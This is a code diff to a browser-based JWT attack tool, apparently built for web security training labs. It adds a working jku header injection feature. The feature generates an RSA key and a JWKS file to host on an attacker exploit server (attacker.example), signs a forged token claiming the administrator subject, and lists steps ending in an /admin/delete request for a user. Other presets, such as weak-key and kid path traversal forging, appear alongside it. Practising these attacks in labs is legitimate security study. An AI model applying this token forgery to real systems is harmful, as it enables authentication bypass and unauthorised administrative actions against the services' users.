@@ -13,6 +13,13 @@ const jwkAlgSelect = document.getElementById('jwkAlgSelect');
 const genJwkAlgKeyBtn = document.getElementById('genJwkAlgKeyBtn');
 const embedJwkSignBtn = document.getElementById('embedJwkSignBtn');
 const jwkAlgHelp = document.getElementById('jwkAlgHelp');
+const jkuTools = document.getElementById('jkuTools');
+const jkuKidInput = document.getElementById('jkuKidInput');
+const genJkuRsaBtn = document.getElementById('genJkuRsaBtn');
+const copyJwksBtn = document.getElementById('copyJwksBtn');
+const signJkuBtn = document.getElementById('signJkuBtn');
+const jwksOutput = document.getElementById('jwksOutput');
+const attackSteps = document.getElementById('attackSteps');
 const generateBtn = document.getElementById('generateBtn');
 const resultToken = document.getElementById('resultToken');
 const attackNotes = document.getElementById('attackNotes');
@@ -20,6 +27,7 @@ const copyBtn = document.getElementById('copyBtn');
 
 let selectedAttack = 'unverified-signature';
 let generatedJwkMaterial = null;
+let generatedJkuMaterial = null;
 
 sourceToken.value = localStorage.getItem('jwt.source') || '';
 if (sourceToken.value) decodeJwt();
@@ -27,6 +35,9 @@ if (sourceToken.value) decodeJwt();
 reloadBtn.addEventListener('click', decodeJwt);
 genJwkAlgKeyBtn.addEventListener('click', generateKeyForJwkAttack);
 embedJwkSignBtn.addEventListener('click', () => generateJwkAttackToken(true));
+genJkuRsaBtn.addEventListener('click', generateJkuKeyMaterial);
+copyJwksBtn.addEventListener('click', copyJwksJson);
+signJkuBtn.addEventListener('click', () => generateJwkAttackToken(true));
 
 for (const btn of document.querySelectorAll('[data-attack]')) {
   btn.addEventListener('click', () => {
@@ -34,10 +45,12 @@ for (const btn of document.querySelectorAll('[data-attack]')) {
     for (const b of document.querySelectorAll('[data-attack]')) b.classList.toggle('secondary', b !== btn);
     configureInputForAttack(selectedAttack);
     attackNotes.textContent = getPresetHint(selectedAttack);
+    attackSteps.textContent = getAttackSteps(selectedAttack);
   });
 }
 
 configureInputForAttack(selectedAttack);
+attackSteps.textContent = getAttackSteps(selectedAttack);
 
 generateBtn.addEventListener('click', async () => {
   await generateJwkAttackToken(false);
@@ -101,11 +114,29 @@ async function generateJwkAttackToken(forceJwkSign) {
     }
 
     if (selectedAttack === 'jku-header-injection') {
+      const jkuUrl = requireInput('Please provide attacker JWKS URL (jku).');
+      if (!generatedJkuMaterial) {
+        await generateJkuKeyMaterial();
+      }
+
+      const kid = jkuKidInput.value.trim() || generatedJkuMaterial.kid;
+      generatedJkuMaterial.kid = kid;
+      generatedJkuMaterial.publicJwk.kid = kid;
+
       nextHeader.alg = 'RS256';
-      nextHeader.jku = requireInput('Please provide attacker JWKS URL (jku).');
-      nextHeader.kid = 'attacker-key-1';
-      nextSig = '<sign-with-private-key-for-jwks-key>';
-      notes = ['Lab: JWT authentication bypass via jku header injection.'];
+      nextHeader.jku = jkuUrl;
+      nextHeader.kid = kid;
+      delete nextHeader.jwk;
+
+      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
+      nextSig = await rsaPkcs1SignBase64url(signingInput, generatedJkuMaterial.privateJwk, 'SHA-256');
+
+      jwksOutput.value = JSON.stringify({ keys: [minimalPublicJwk(generatedJkuMaterial.publicJwk)] }, null, 2);
+      notes = [
+        'Lab: JWT authentication bypass via jku header injection.',
+        `Signed with generated RSA key and kid=${kid}.`,
+        'Upload JWKS JSON to your exploit server and set jku to that URL.',
+      ];
     }
 
     if (selectedAttack === 'kid-path-traversal') {
@@ -133,6 +164,7 @@ copyBtn.addEventListener('click', async () => {
 
 function configureInputForAttack(key) {
   jwkTools.classList.add('hidden');
+  jkuTools.classList.add('hidden');
 
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
 
@@ -142,7 +174,11 @@ function configureInputForAttack(key) {
     return;
   }
 
-  if (key === 'jku-header-injection') return showInput('JKU URL', 'https://attacker.example/jwks.json', 'Required attacker-controlled JWKS URL.');
+  if (key === 'jku-header-injection') {
+    showInput('JKU URL', 'https://attacker.example/jwks.json', 'Required attacker-controlled JWKS URL where jwks.json is hosted.');
+    jkuTools.classList.remove('hidden');
+    return;
+  }
   if (key === 'kid-path-traversal') return showInput('Signing key', '', 'Required signing key ("" for empty).');
 
   attackInputSection.classList.add('hidden');
@@ -165,6 +201,48 @@ function requireInput(message) {
 function readJsonInput(example, errorMessage) {
   const raw = requireInput(errorMessage);
   try { return JSON.parse(raw); } catch { throw new Error(`Invalid JSON input. Example: ${example}`); }
+}
+
+
+async function generateJkuKeyMaterial() {
+  generatedJkuMaterial = await generateKeyMaterialForAlg('RS256');
+  generatedJkuMaterial.kid = crypto.randomUUID();
+  generatedJkuMaterial.publicJwk.kid = generatedJkuMaterial.kid;
+  jkuKidInput.value = generatedJkuMaterial.kid;
+  jwksOutput.value = JSON.stringify({ keys: [minimalPublicJwk(generatedJkuMaterial.publicJwk)] }, null, 2);
+  attackNotes.textContent = 'Generated RSA key for JKU attack and prepared JWKS JSON.';
+}
+
+async function copyJwksJson() {
+  if (!jwksOutput.value) await generateJkuKeyMaterial();
+  await navigator.clipboard.writeText(jwksOutput.value);
+  attackNotes.textContent = 'JWKS JSON copied to clipboard.';
+}
+
+function getAttackSteps(key) {
+  if (key === 'jku-header-injection') {
+    return [
+      '1) Paste source JWT and click Decode token.',
+      '2) In payload editor set sub claim to administrator.',
+      '3) In Attack-specific input paste your exploit server JWKS URL (jku).',
+      '4) Click Generate RSA key for JKU to create key + kid + JWKS JSON.',
+      '5) Click Copy JWKS JSON and upload it to your exploit server at that URL.',
+      '6) Click Sign JKU token now (or Generate) to sign JWT with generated private key.',
+      '7) Send request with this token to /admin, then call /admin/delete?username=carlos.',
+    ].join('\n');
+  }
+
+  if (key === 'jwk-header-injection') {
+    return [
+      '1) Paste source JWT and click Decode token.',
+      '2) In payload editor set sub claim to administrator.',
+      '3) Choose algorithm and click Generate key for selected alg.',
+      '4) Click Embed JWK & Sign token.',
+      '5) Send request with generated token.',
+    ].join('\n');
+  }
+
+  return 'Select an attack to see guided steps.';
 }
 
 function getPresetHint(key) {
@@ -229,10 +307,10 @@ async function generateKeyMaterialForAlg(alg) {
 
 function minimalPublicJwk(jwk) {
   if (!jwk || !jwk.kty) throw new Error('Invalid JWK');
-  if (jwk.kty === 'RSA') return { kty: 'RSA', n: jwk.n, e: jwk.e };
-  if (jwk.kty === 'EC') return { kty: 'EC', crv: jwk.crv, x: jwk.x, y: jwk.y };
-  if (jwk.kty === 'OKP') return { kty: 'OKP', crv: jwk.crv, x: jwk.x };
-  if (jwk.kty === 'oct') return { kty: 'oct', k: jwk.k };
+  if (jwk.kty === 'RSA') return { kty: 'RSA', n: jwk.n, e: jwk.e, ...(jwk.kid ? { kid: jwk.kid } : {}) };
+  if (jwk.kty === 'EC') return { kty: 'EC', crv: jwk.crv, x: jwk.x, y: jwk.y, ...(jwk.kid ? { kid: jwk.kid } : {}) };
+  if (jwk.kty === 'OKP') return { kty: 'OKP', crv: jwk.crv, x: jwk.x, ...(jwk.kid ? { kid: jwk.kid } : {}) };
+  if (jwk.kty === 'oct') return { kty: 'oct', k: jwk.k, ...(jwk.kid ? { kid: jwk.kid } : {}) };
   return jwk;
 }
 async function signWithMaterial(signingInput, alg, material) {
